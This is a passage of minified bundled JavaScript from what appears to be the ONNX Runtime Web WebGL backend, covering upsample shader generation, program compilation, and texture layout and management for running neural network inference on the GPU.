d=dim-1;d>=0;d--)outputPitches[d]=d===dim-1?1:outputPitches[d+1]*outputShape[d+1],inputPitches[d]=d===dim-1?1:inputPitches[d+1]*inputs[0].dims[d+1],precalculatedPitches+=`\n        output_pitches[${d}] = ${outputPitches[d]};\n        input_pitches[${d}] = ${inputPitches[d]};\n        `;const getInputFloatFunction=`\n      float getInputFloat(int index) {\n        vec2 coords = offsetToCoords(index, ${inputWidth}, ${inputHeight});\n        float value = getColorAsFloat(${glsl.texture2D}(X, coords));\n        return value;\n      }\n      `,shaderSource="nearest"===attributes.mode?`\n    ${getInputFloatFunction}\n    float process(int indices[${dim}]) {\n      int input_index = 0;\n      int output_index = coordsToOffset(TexCoords, ${outputWidth}, ${outputHeight});\n\n      ${precalculatedPitches}\n\n      int d, m;\n      for (int dim = 0; dim < ${dim}; ++dim) {\n        d = output_index / output_pitches[dim];\n        m = output_index - d * output_pitches[dim];\n        output_index = m;\n\n        if (scales[dim] != 1 && d > 0) {\n          int d2 = d / scales[dim];\n          m = d - d2 * scales[dim];\n          d = d2;\n        }\n        input_index += input_pitches[dim] * d;\n      }\n\n      return getInputFloat(input_index);\n    }`:4===dim?`\n    ${getInputFloatFunction}\n    float process(int indices[4]) {\n      int input_index = 0;\n      int output_index = coordsToOffset(TexCoords, ${outputWidth}, ${outputHeight});\n\n      ${precalculatedPitches}\n\n      int m;\n      int index_of_dim0, index_of_dim1, index_of_dim2, index_of_dim3;\n      index_of_dim0 = output_index / output_pitches[0];\n      m = output_index - index_of_dim0 * output_pitches[0];\n      index_of_dim1 = m / output_pitches[1];\n      m = m - index_of_dim1 * output_pitches[1];\n      index_of_dim2 = m / output_pitches[2];\n      m = m - index_of_dim2 * output_pitches[2];\n      index_of_dim3 = m;\n\n      int index_of_input_dim2, index_of_input_dim3, x_offset, y_offset;\n      index_of_input_dim2 = index_of_dim2 / scales[2];\n      y_offset = index_of_dim2 - index_of_input_dim2 * scales[2];\n      index_of_input_dim3 = index_of_dim3 / scales[3];\n      x_offset = index_of_dim3 - index_of_input_dim3 * scales[3];\n\n      input_index = index_of_dim0 * input_pitches[0] +\n            index_of_dim1 * input_pitches[1] +\n            index_of_input_dim2 * input_pitches[2] +\n            index_of_input_dim3;\n\n      float x00 = getInputFloat(input_index);\n      float x10, x01, x11;\n\n      bool end_of_dim2 = false;\n      if (index_of_input_dim2 == (${inputs[0].dims[2]} - 1)) {\n        // It's the end in dimension 2\n        x01 = x00;\n        end_of_dim2 = true;\n      } else {\n        x01 = getInputFloat(input_index + input_pitches[2]);\n      }\n\n      if (index_of_input_dim3 == (input_pitches[2] - 1)) {\n        // It's the end in dimension 3\n        x10 = x00;\n        x11 = x01;\n      }\n      else {\n        x10 = getInputFloat(input_index + 1);\n        x11 = end_of_dim2 ? x10 : getInputFloat(input_index + input_pitches[2] + 1);\n      }\n\n      float y0 = x00 + float(y_offset) * (x01 - x00) / float(scales[2]);\n      float y1 = x10 + float(y_offset) * (x11 - x10) / float(scales[2]);\n      return y0 + float(x_offset) * (y1 - y0) / float(scales[3]);\n    }`:`\n    ${getInputFloatFunction}\n    float process(int indices[2]) {\n      int input_index = 0;\n      int output_index = coordsToOffset(TexCoords, ${outputWidth}, ${outputHeight});\n\n      ${precalculatedPitches}\n\n      int m;\n      int index_of_dim0, index_of_dim1;\n      index_of_dim0 = output_index / output_pitches[0];\n      m = output_index - index_of_dim0 * output_pitches[0];\n      index_of_dim1 = m;\n\n      int index_of_input_dim0, index_of_input_dim1, x_offset, y_offset;\n      index_of_input_dim0 = index_of_dim0 / scales[0];\n      y_offset = index_of_dim0 - index_of_input_dim0 * scales[0];\n      index_of_input_dim1 = index_of_dim1 / scales[1];\n      x_offset = index_of_dim1 - index_of_input_dim1 * scales[1];\n\n      input_index = index_of_input_dim0 * input_pitches[0] + index_of_input_dim1;\n\n      float x00 = getInputFloat(input_index);\n      float x10, x01, x11;\n\n      bool end_of_dim0 = false;\n      if (index_of_input_dim0 == (${inputs[0].dims[0]} - 1)) {\n        // It's the end in dimension 0\n        x01 = x00;\n        end_of_dim0 = true;\n      } else {\n        x01 = getInputFloat(input_index + input_pitches[0]);\n      }\n\n      if (index_of_input_dim1 == (input_pitches[0] - 1)) {\n        // It's the end in dimension 1\n        x10 = x00;\n        x11 = x01;\n      }\n      else {\n        x10 = getInputFloat(input_index + 1);\n        x11 = end_of_dim0 ? x10 : getInputFloat(input_index + input_pitches[0] + 1);\n      }\n\n      float y0 = x00 + float(y_offset) * (x01 - x00) / float(scales[0]);\n      float y1 = x10 + float(y_offset) * (x11 - x10) / float(scales[0]);\n      return y0 + float(x_offset) * (y1 - y0) / float(scales[1]);\n    }`;return Object.assign(Object.assign({},upsampleProgramMetadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource,variables:[{name:"scales",type:"int",arrayLength:attributes.scales.length,data:attributes.scales.map((x=>Math.ceil(x)))}]})};exports.validateInputs=(inputs,attribute)=>{if(!inputs||attribute.opset<9&&1!==inputs.length||attribute.opset>=9&&attribute.opset<11&&2!==inputs.length||attribute.opset>=11&&inputs.length<2)throw new Error("invalid inputs.");if(attribute.scales.length>0&&inputs[0].dims.length!==attribute.scales.length)throw new Error("Invalid input shape.");if("string"===inputs[0].type)throw new Error("Invalid input tensor types.")};exports.scalesValidation=(scales,mode,isResize)=>{if(isResize){for(const scale of scales)if(scale<=0)throw new Error("Scale value should be greater than 0.")}else for(const scale of scales)if(scale<1)throw new Error("Scale value should be greater than or equal to 1.");if(!("linear"!==mode&&"cubic"!==mode||2===scales.length||4===scales.length&&1===scales[0]&&1===scales[1]))throw new Error(`'Linear' mode and 'Cubic' mode only support 2-D inputs ('Bilinear', 'Bicubic')         or 4-D inputs with the corresponding outermost 2 scale values being 1         in the ${isResize?"Resize":"Upsample"} opeartor.`)}},"./lib/onnxjs/backends/webgl/program-manager.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.ProgramManager=void 0;const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),glsl_preprocessor_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-preprocessor.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts");exports.ProgramManager=class ProgramManager{constructor(profiler,glContext,textureLayoutStrategy){this.profiler=profiler,this.glContext=glContext,this.textureLayoutStrategy=textureLayoutStrategy,this.repo=new Map,this.attributesBound=!1}getArtifact(key){return this.repo.get(key)}setArtifact(key,artifact){this.repo.set(key,artifact)}run(buildArtifact,inputs,output){var _a;this.profiler.event("op",`ProgramManager.run ${null!==(_a=buildArtifact.programInfo.name)&&void 0!==_a?_a:"unknown kernel"}`,(()=>{var _a;const gl=this.glContext.gl,program=buildArtifact.program;gl.useProgram(program);try{this.bindOutput(output),this.attributesBound||this.bindAttributes(buildArtifact.attribLocations),this.bindUniforms(buildArtifact.uniformLocations,null!==(_a=buildArtifact.programInfo.variables)&&void 0!==_a?_a:[],inputs)}catch(err){throw instrument_1.Logger.error("ProgramManager",buildArtifact.programInfo.shaderSource),err}this.profiler.event("backend","GlContext.draw()",(()=>{this.glContext.draw()}))}),this.glContext)}dispose(){this.vertexShader&&this.glContext.deleteShader(this.vertexShader),this.repo.forEach((a=>this.glContext.deleteProgram(a.program)))}build(programInfo,inputTextureLayouts,outputTextureLayout){return this.profiler.event("backend","ProgramManager.build",(()=>{const preprocessor=new glsl_preprocessor_1.GlslPreprocessor(this.glContext,programInfo,inputTextureLayouts,outputTextureLayout),fragScript=preprocessor.preprocess(),program=this.compile(fragScript);return{programInfo:programInfo,program:program,uniformLocations:this.getUniformLocations(program,preprocessor.context.programInfo.inputNames,preprocessor.context.programInfo.variables),attribLocations:this.getAttribLocations(program)}}))}compile(fragShaderScript){if(!this.vertexShader){instrument_1.Logger.verbose("ProrgramManager","Compiling and caching Vertex shader for the first time");const vertexShaderScript=(0,glsl_source_1.getVertexShaderSource)(this.glContext.version);this.vertexShader=this.glContext.compileShader(vertexShaderScript,this.glContext.gl.VERTEX_SHADER)}onnxruntime_common_1.env.debug&&instrument_1.Logger.verbose("ProrgramManager",`FragShader:\n${fragShaderScript}\n`);const fragShader=this.glContext.compileShader(fragShaderScript,this.glContext.gl.FRAGMENT_SHADER),program=this.glContext.createProgram(this.vertexShader,fragShader);return this.glContext.deleteShader(fragShader),program}bindOutput(td){const width=td.width,height=td.height;instrument_1.Logger.verbose("ProrgramManager",`Binding output texture to Framebuffer: w/h=${width}/${height}, shape=${td.shape}, type=${td.tensor.type}`),this.glContext.attachFramebuffer(td.texture,width,height)}bindAttributes(attribLocations){const positionHandle=attribLocations.position,textureCoordHandle=attribLocations.textureCoord;this.glContext.setVertexAttributes(positionHandle,textureCoordHandle),this.attributesBound=!0}bindUniforms(uniformLocations,variables,textures){var _a;const gl=this.glContext.gl;let texturePosition=0;for(const{name:name,type:type,location:location,arrayLength:arrayLength}of uniformLocations){const value=null===(_a=variables.find((v=>v.name===name)))||void 0===_a?void 0:_a.data;if("sampler2D"!==type&&!value)throw new Error(`variable '${name}' does not have data defined in program info`);switch(type){case"sampler2D":this.bindTexture(textures[texturePosition],location,texturePosition),texturePosition++;break;case"float":arrayLength?gl.uniform1fv(location,value):gl.uniform1f(location,value);break;case"int":arrayLength?gl.uniform1iv(location,value):gl.uniform1i(location,value);break;default:throw new Error(`Uniform not implemented: ${type}`)}}}bindTexture(td,uniformHandle,position){this.glContext.bindTextureToUniform(td.texture,position,uniformHandle)}getAttribLocations(program){return{position:this.getAttribLocation(program,"position"),textureCoord:this.getAttribLocation(program,"textureCoord")}}getUniformLocations(program,samplers,variables){const uniformLocations=[];if(samplers)for(const sampler of samplers)uniformLocations.push({name:sampler,type:"sampler2D",location:this.getUniformLocation(program,sampler)});if(variables)for(const variable of variables)uniformLocations.push(Object.assign(Object.assign({},variable),{location:this.getUniformLocation(program,variable.name)}));return uniformLocations}getUniformLocation(program,name){const reference=this.glContext.gl.getUniformLocation(program,name);if(null===reference)throw new Error(`Uniform ${name} not found.`);return reference}getAttribLocation(program,name){return this.glContext.gl.getAttribLocation(program,name)}}},"./lib/onnxjs/backends/webgl/session-handler.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.WebGLSessionHandler=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),opset_1=__webpack_require__("./lib/onnxjs/opset.ts"),inference_handler_1=__webpack_require__("./lib/onnxjs/backends/webgl/inference-handler.ts"),op_resolve_rules_1=__webpack_require__("./lib/onnxjs/backends/webgl/op-resolve-rules.ts"),program_manager_1=__webpack_require__("./lib/onnxjs/backends/webgl/program-manager.ts"),texture_layout_strategy_1=__webpack_require__("./lib/onnxjs/backends/webgl/texture-layout-strategy.ts"),texture_manager_1=__webpack_require__("./lib/onnxjs/backends/webgl/texture-manager.ts");exports.WebGLSessionHandler=class WebGLSessionHandler{constructor(backend,context){this.backend=backend,this.context=context,this.layoutStrategy=new texture_layout_strategy_1.PreferLogicalStrategy(backend.glContext.maxTextureSize),this.programManager=new program_manager_1.ProgramManager(this.context.profiler,backend.glContext,this.layoutStrategy),this.textureManager=new texture_manager_1.TextureManager(backend.glContext,this.layoutStrategy,this.context.profiler,{reuseTextures:"full"===backend.textureCacheMode}),this.packedTextureDataCache=new Map,this.unpackedTextureDataCache=new Map,this.pack=backend.pack,this.pack2unpackMap=new Map,this.unpack2packMap=new Map}createInferenceHandler(){return new inference_handler_1.WebGLInferenceHandler(this)}onGraphInitialized(graph){const initializers=graph.getValues().filter((v=>-1===v.from&&v.tensor)).map((v=>v.tensor.dataId));this.initializers=new Set(initializers)}isInitializer(tensorId){return!!this.initializers&&this.initializers.has(tensorId)}addInitializer(tensorId){this.initializers.add(tensorId)}getTextureData(tensorId,isPacked){return isPacked?this.packedTextureDataCache.get(tensorId):this.unpackedTextureDataCache.get(tensorId)}setTextureData(tensorId,textureData,isPacked=!1){instrument_1.Logger.verbose("WebGLSessionHandler","Storing Texture data in cache"),isPacked?this.packedTextureDataCache.set(tensorId,textureData):this.unpackedTextureDataCache.set(tensorId,textureData)}dispose(){this.programManager.dispose(),this.textureManager.clearActiveTextures(),this.packedTextureDataCache.forEach((td=>this.textureManager.releaseTexture(td,!0))),this.packedTextureDataCache=new Map,this.unpackedTextureDataCache.forEach((td=>this.textureManager.releaseTexture(td,!0))),this.unpackedTextureDataCache=new Map}resolve(node,opsets,graph){const op=(0,opset_1.resolveOperator)(node,opsets,op_resolve_rules_1.WEBGL_OP_RESOLVE_RULES);return{impl:op.opImpl,context:op.opInit?op.opInit(node,graph):node}}}},"./lib/onnxjs/backends/webgl/texture-data-encoder.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Uint8DataEncoder=exports.RGBAFloatDataEncoder=exports.RedFloat32DataEncoder=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts");exports.RedFloat32DataEncoder=class RedFloat32DataEncoder{constructor(gl,channels=1){if(1===channels)this.internalFormat=gl.R32F,this.format=gl.RED,this.textureType=gl.FLOAT,this.channelSize=channels;else{if(4!==channels)throw new Error(`Invalid number of channels: ${channels}`);this.internalFormat=gl.RGBA32F,this.format=gl.RGBA,this.textureType=gl.FLOAT,this.channelSize=channels}}encode(src,textureSize){let result,source;return src.constructor!==Float32Array&&(instrument_1.Logger.warning("Encoder","data was not of type Float32; creating new Float32Array"),source=new Float32Array(src)),textureSize*this.channelSize>src.length?(instrument_1.Logger.warning("Encoder","Source data too small. Allocating larger array"),source=src,result=this.allocate(textureSize*this.channelSize),source.forEach(((v,i)=>result[i]=v))):(source=src,result=source),result}allocate(size){return new Float32Array(4*size)}decode(buffer,dataSize){if(1===this.channelSize){return buffer.filter(((value,index)=>index%4==0)).subarray(0,dataSize)}return buffer.subarray(0,dataSize)}};exports.RGBAFloatDataEncoder=class RGBAFloatDataEncoder{constructor(gl,channels=1,textureType){if(1!==channels&&4!==channels)throw new Error(`Invalid number of channels: ${channels}`);this.internalFormat=gl.RGBA,this.format=gl.RGBA,this.channelSize=channels,this.textureType=textureType||gl.FLOAT}encode(src,textureSize){let dest=src;return 1===this.channelSize&&(instrument_1.Logger.verbose("Encoder","Exploding into a larger array"),dest=this.allocate(textureSize),src.forEach(((v,i)=>dest[4*i]=v))),dest}allocate(size){return new Float32Array(4*size)}decode(buffer,dataSize){if(1===this.channelSize){return buffer.filter(((value,index)=>index%4==0)).subarray(0,dataSize)}return buffer.subarray(0,dataSize)}};exports.Uint8DataEncoder=class Uint8DataEncoder{constructor(gl,channels=1){if(this.channelSize=4,1===channels)this.internalFormat=gl.ALPHA,this.format=gl.ALPHA,this.textureType=gl.UNSIGNED_BYTE,this.channelSize=channels;else{if(4!==channels)throw new Error(`Invalid number of channels: ${channels}`);this.internalFormat=gl.RGBA,this.format=gl.RGBA,this.textureType=gl.UNSIGNED_BYTE,this.channelSize=channels}}encode(src,_textureSize){return new Uint8Array(src.buffer,src.byteOffset,src.byteLength)}allocate(size){return new Uint8Array(size*this.channelSize)}decode(buffer,dataSize){if(buffer instanceof Uint8Array)return buffer.subarray(0,dataSize);throw new Error(`Invalid array type: ${buffer.constructor}`)}}},"./lib/onnxjs/backends/webgl/texture-layout-strategy.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getBatchDim=exports.sizeToSquarishShape=exports.getRowsCols=exports.sizeFromShape=exports.isInt=exports.parseAxisParam=exports.squeezeShape=exports.PreferLogicalStrategy=exports.AlwaysKeepOriginalSizeStrategy=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.AlwaysKeepOriginalSizeStrategy=class AlwaysKeepOriginalSizeStrategy{constructor(maxTextureSize){this.maxTextureSize=maxTextureSize}computeTextureWH(shape,prefs){if(0===shape.length)return[1,1];const maxTextureSize=this.maxTextureSize;if(prefs&&void 0!==prefs.breakAxis){const wsize=prefs.breakAxis>=shape.length?1:shape.slice(prefs.breakAxis).reduce(((a,b)=>a*b)),hsize=prefs.breakAxis<=0?1:shape.slice(0,prefs.breakAxis).reduce(((a,b)=>a*b));if(!(wsize>maxTextureSize||hsize>maxTextureSize))return[wsize,hsize];instrument_1.Logger.verbose("TextureLayout",`Given width/height preferences were unattainable: shape:${shape}, breakAxis:${prefs.breakAxis}`)}const totalSize=shape.reduce(((a,b)=>a*b));let width=Math.floor(Math.sqrt(totalSize));for(;width<maxTextureSize&&width<totalSize&&totalSize%width!=0;width++);if(width>=maxTextureSize||totalSize%width!=0)throw new Error(`The given dimensions are outside this GPU's boundaries: ${shape}`);return[width,totalSize/width]}};function squeezeShape(shape,axis){const newShape=[],keptDims=[],isEmptyArray=null!=axis&&Array.isArray(axis)&&0===axis.length,axes=null==axis||isEmptyArray?null:parseAxisParam(axis,shape).sort();let j=0;for(let i=0;i<shape.length;++i){if(null!=axes){if(axes[j]===i&&1!==shape[i])throw new Error(`Can't squeeze axis ${i} since its dim '${shape[i]}' is not 1`);(null==axes[j]||axes[j]>i)&&1===shape[i]&&(newShape.push(shape[i]),keptDims.push(i)),axes[j]<=i&&j++}1!==shape[i]&&(newShape.push(shape[i]),keptDims.push(i))}return{newShape:newShape,keptDims:keptDims}}function parseAxisParam(axis,shape){const rank=shape.length;return axis=null==axis?shape.map(((s,i)=>i)):[].concat(axis),(0,util_1.assert)(axis.every((ax=>ax>=-rank&&ax<rank)),(()=>`All values in axis param must be in range [-${rank}, ${rank}) but got axis ${axis}`)),(0,util_1.assert)(axis.every(isInt),(()=>`All values in axis param must be integers but got axis ${axis}`)),axis.map((a=>a<0?rank+a:a))}function isInt(a){return a%1==0}function sizeFromShape(shape){if(0===shape.length)return 1;let size=shape[0];for(let i=1;i<shape.length;i++)size*=shape[i];return size}function sizeToSquarishShape(size){const width=Math.ceil(Math.sqrt(size));return[width,Math.ceil(size/width)]}exports.PreferLogicalStrategy=class PreferLogicalStrategy{constructor(maxTextureSize){this.maxTextureSize=maxTextureSize}computeTextureWH(shape,prefs){const wh=this.computeTexture(shape,prefs);return prefs&&prefs.isPacked&&(wh[0]/=2,wh[1]/=2),prefs&&prefs.reverseWH?[wh[1],wh[0]]:wh}computeTexture(shape,prefs){const isPacked=prefs&&prefs.isPacked;if(0===shape.length)return isPacked?[2,2]:[1,1];let maxTextureSize=this.maxTextureSize;if(prefs&&void 0!==prefs.breakAxis){const wsize=prefs.breakAxis>=shape.length?1:shape.slice(prefs.breakAxis).reduce(((a,b)=>a*b)),hsize=prefs.breakAxis<=0?1:shape.slice(0,prefs.breakAxis).reduce(((a,b)=>a*b));if(!(wsize>maxTextureSize||hsize>maxTextureSize))return[wsize,hsize];instrument_1.Logger.verbose("TextureLayout",`Given width/height preferences were unattainable: shape:${shape}, breakAxis:${prefs.breakAxis}`)}let logShape=shape.slice(0);if(isPacked&&(maxTextureSize*=2,logShape=logShape.map(((d,i)=>i>=logShape.length-2?logShape[i]%2==0?logShape[i]:logShape[i]+1:logShape[i])),1===logShape.length&&(logShape=[2,logShape[0]])),2!==logShape.length){const squeezeResult=squeezeShape(logShape);logShape=squeezeResult.newShape}const size=sizeFromShape(logShape);return logShape.length<=1&&size<=maxTextureSize?[1,size]:2===logShape.length&&logShape[0]<=maxTextureSize&&logShape[1]<=maxTextureSize?logShape:3===logShape.length&&logShape[0]*logShape[1]<=maxTextureSize&&logShape[2]<=maxTextureSize?[logShape[0]*logShape[1],logShape[2]]:3===logShape.length&&logShape[0]<=maxTextureSize&&logShape[1]*logShape[2]<=maxTextureSize?[logShape[0],logShape[1]*logShape[2]]:4===logShape.length&&logShape[0]*logShape[1]*logShape[2]<=maxTextureSize&&logShape[3]<=maxTextureSize?[logShape[0]*logShape[1]*logShape[2],logShape[3]]:4===logShape.length&&logShape[0]<=maxTextureSize&&logShape[1]*logShape[2]*logShape[3]<=maxTextureSize?[logShape[0],logShape[1]*logShape[2]*logShape[3]]:isPacked?sizeToSquarishShape(size/4).map((d=>2*d)):sizeToSquarishShape(size)}},exports.squeezeShape=squeezeShape,exports.parseAxisParam=parseAxisParam,exports.isInt=isInt,exports.sizeFromShape=sizeFromShape,exports.getRowsCols=function getRowsCols(shape){if(0===shape.length)throw Error("Cannot get rows and columns of an empty shape array.");return[shape.length>1?shape[shape.length-2]:1,shape[shape.length-1]]},exports.sizeToSquarishShape=sizeToSquarishShape,exports.getBatchDim=function getBatchDim(shape,dimsToSkip=2){return sizeFromShape(shape.slice(0,shape.length-dimsToSkip))}},"./lib/onnxjs/backends/webgl/texture-layout.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createTextureLayoutFromShape=exports.calculateTextureWidthAndHeight=exports.createTextureLayoutFromTextureType=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.createTextureLayoutFromTextureType=(textureLayoutStrategy,shape,textureType)=>{const channel=textureType===types_1.TextureType.unpacked||textureType===types_1.TextureType.unpackedReversed?1:4,isPacked=textureType===types_1.TextureType.packed,reverseWH=textureType===types_1.TextureType.unpackedReversed||textureType===types_1.TextureType.packed,breakAxis=textureType===types_1.TextureType.packedLastDimension?shape.length-1:void 0,unpackedShape=textureType===types_1.TextureType.packedLastDimension?shape.map(((d,i)=>i===shape.length-1?4*d:d)):void 0;return(0,exports.createTextureLayoutFromShape)(textureLayoutStrategy,shape,channel,unpackedShape,{isPacked:isPacked,reverseWH:reverseWH,breakAxis:breakAxis})};exports.calculateTextureWidthAndHeight=(textureLayoutStrategy,shape,textureType)=>{const layout=(0,exports.createTextureLayoutFromTextureType)(textureLayoutStrategy,shape,textureType);return[layout.width,layout.height]};exports.createTextureLayoutFromShape=(textureLayoutStrategy,shape,channels=1,unpackedShape,prefs)=>{const isPacked=!(!prefs||!prefs.isPacked),[width,height]=textureLayoutStrategy.computeTextureWH(isPacked&&unpackedShape||shape,prefs),rank=shape.length;let inferredDims=shape.slice(0);if(0===rank&&(inferredDims=[1]),1===channels)unpackedShape=shape;else if(isPacked){if(4!==channels)throw new Error("a packed texture must be 4-channel");unpackedShape=shape,rank>0&&(inferredDims[rank-1]=Math.ceil(inferredDims[rank-1]/2)),rank>1&&(inferredDims[rank-2]=Math.ceil(inferredDims[rank-2]/2))}else if(!unpackedShape)throw new Error("Unpacked shape is needed when using channels > 1");return{width:width,height:height,channels:channels,isPacked:isPacked,shape:inferredDims,strides:util_1.ShapeUtil.computeStrides(inferredDims),unpackedShape:unpackedShape,reversedWH:prefs&&prefs.reverseWH}}},"./lib/onnxjs/backends/webgl/texture-manager.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.TextureManager=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts");exports.TextureManager=class TextureManager{constructor(glContext,layoutStrategy,profiler,config){this.glContext=glContext,this.layoutStrategy=layoutStrategy,this.profiler=profiler,this.config=config,this.pendingRead=new Map,config.reuseTextures&&(this.inUseTextures=new Map,this.idleTextures=new Map,this.textureLookup=new Map)}createTextureFromLayout(dataType,layout,data,usage){const textureDataType=this.toEncoderType(dataType),encoder=this.glContext.getEncoder(textureDataType,layout.channels||1,usage);if(layout.isPacked&&1===usage)throw new Error("not implemented");const width=layout.width,height=layout.height;let key,inUseTextures;if(this.config.reuseTextures){key=`${width}x${height}_${encoder.format}_${encoder.internalFormat}_${encoder.textureType}`,inUseTextures=this.inUseTextures.get(key),inUseTextures||(inUseTextures=[],this.inUseTextures.set(key,inUseTextures));const idleTextures=this.idleTextures.get(key);if(idleTextures&&idleTextures.length>0){const texture=idleTextures.pop();return inUseTextures.push(texture),1===usage&&this.glContext.updateTexture(texture,width,height,encoder,this.toTextureData(dataType,data)),texture}}instrument_1.Logger.verbose("TextureManager",`Creating new texture of size ${layout.width}x${layout.height}`);const texture=this.glContext.allocateTexture(width,height,encoder,this.toTextureData(dataType,data));return this.config.reuseTextures&&(inUseTextures.push(texture),this.textureLookup.set(texture,key)),texture}readTexture(td,dataType,channels){return channels||(channels=1),this.profiler.event("backend","TextureManager.readTexture",(()=>{const dataSize=td.shape.reduce(((a,b)=>a*b))*channels,data=this.glContext.readTexture(td.texture,td.width,td.height,dataSize,this.toEncoderType(dataType),channels);return this.toTensorData(dataType,data)}))}async readTextureAsync(td,dataType,channels){const dataId=td.tensor.dataId;if(channels||(channels=1),this.pendingRead.has(dataId)){const subscribers=this.pendingRead.get(dataId);return new Promise((resolve=>null==subscribers?void 0:subscribers.push(resolve)))}return this.profiler.event("backend","TextureManager.readTextureAsync",(async()=>{this.pendingRead.set(dataId,[]);const dataSize=td.shape.reduce(((a,b)=>a*b))*channels;await this.glContext.createAndWaitForFence();const data=this.glContext.readTexture(td.texture,td.width,td.height,dataSize,this.toEncoderType(dataType),channels),tensorData=this.toTensorData(dataType,data),subscribers=this.pendingRead.get(dataId);return this.pendingRead.delete(dataId),null==subscribers||subscribers.forEach((resolve=>resolve(tensorData))),tensorData}))}readUint8TextureAsFloat(td){return this.profiler.event("backend","TextureManager.readUint8TextureAsFloat",(()=>{const dataSize=td.shape.reduce(((a,b)=>a*b)),data=this.glContext.readTexture(td.texture,td.width,td.height,4*dataSize,"byte",4);return new Float32Array(data.buffer,data.byteOffset,dataSize)}))}releaseTexture(textureData,deleteTexture){let key;if(this.config.reuseTextures&&(key=this.textureLookup.get(textureData.texture),key)){deleteTexture&&this.textureLookup.delete(key);const inUseTextures=this.inUseTextures.get(key);if(inUseTextures){const index=inUseTextures.indexOf(textureData.texture);if(-1!==index){inUseTextures.splice(index,1);let idleTextures=this.idleTextures.get(key);idleTextures||(idleTextures=[],this.idleTextures.set(key,idleTextures)),idleTextures.push(textureData.texture)}}}key&&!deleteTexture||(instrument_1.Logger.verbose("TextureManager",`Deleting texture of size ${textureData.width}x${textureData.height}`),this.glContext.deleteTexture(textureData.texture))}toTensorData(dataType,data){switch(dataType){case"int16":return data instanceof Int16Array?data:Int16Array.from(data);case"int32":return data instanceof Int32Array?data:Int32Array.from(data);case"int8":return data instanceof Int8Array?data:Int8Array.from(data);case"uint16":return data instanceof Uint16Array?data:Uint16Array.from(data);case"uint32":return data instanceof Uint32Array?data:Uint32Array.from(data);case"uint8":case"bool":return data instanceof Uint8Array?data:Uint8Array.from(data);case"float32":return data instanceof Float32Array?data:Float32Array.from(data);case"float64":return data instanceof Float64Array?data:Float64Array.from(data);default:throw new Error(`TensorData type ${dataType} is not supported`)}}toTextureData(dataType,data){if(data)return data instanceof Float32Array?data:new Float32Array(data)}toEncoderType(_dataType){return"float"}clearActiveTextures(){this.glContext.clearActiveTextures()}}},"./lib/onnxjs/backends/webgl/types.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.TextureType=void 0,function(TextureType){TextureType[TextureType.unpacked=0]="unpacked",TextureType[TextureType.unpackedReversed=1]="unpackedReversed",TextureType[TextureType.packed=2]="packed",TextureType[TextureType.downloadUint8AsFloat=3]="downloadUint8AsFloat",TextureType[TextureType.packedLastDimension=4]="packedLastDimension"}(exports.TextureType||(exports.TextureType={}))},"./lib/onnxjs/backends/webgl/utils.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getGlChannels=exports.getCoordsDataType=exports.getSqueezedParams=exports.squeezeInputShape=exports.generateShaderFuncNameFromInputSamplerNameAtOutCoords=exports.generateShaderFuncNameFromInputSamplerName=exports.repeatedTry=exports.getPackedShape=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.getPackedShape=function getPackedShape(unpackedShape){const len=unpackedShape.length;return unpackedShape.slice(0,len-1).concat(unpackedShape[len-1]/4)},exports.repeatedTry=async function repeatedTry(checkFn,delayFn=(_counter=>0),maxCounter){return new Promise(((resolve,reject)=>{let tryCount=0;const tryFn=()=>{if(checkFn())return void resolve();tryCount++;const nextBackoff=delayFn(tryCount);null!=maxCounter&&tryCount>=maxCounter?reject():setTimeout(tryFn,nextBackoff)};tryFn()}))},exports.generateShaderFuncNameFromInputSamplerName=function generateShaderFuncNameFromInputSamplerName(samplerName){return(0,util_1.assert)(void 0!==samplerName&&0!==samplerName.length,(()=>"empty string found for sampler name")),"get"+samplerName.charAt(0).toUpperCase()+samplerName.slice(1)},exports.generateShaderFuncNameFromInputSamplerNameAtOutCoords=function generateShaderFuncNameFromInputSamplerNameAtOutCoords(samplerName){return(0,util_1.assert)(void 0!==samplerName&&0!==samplerName.length,(()=>"empty string found for sampler name")),"get"+samplerName.charAt(0).toUpperCase()+samplerName.slice(1)+"AtOutCoords"},exports.squeezeInputShape=function squeezeInputShape(inputShape,squeezedShape){let newInputShape=JSON.parse(JSON.stringify(inputShape));return newInputShape=squeezedShape,newInputShape},exports.getSqueezedParams=function getSqueezedParams(params,keptDims){return keptDims.map((d=>params[d])).join(", ")},exports.getCoordsDataType=function getCoordsDataType(rank){if(rank<=1)return"int";if(2===rank)return"ivec2";if(3===rank)return"ivec3";if(4===rank)return"ivec4";if(5===rank)return"ivec5";if(6===rank)return"ivec6";throw Error(`GPU for rank ${rank} is not yet supported`)},exports.getGlChannels=function 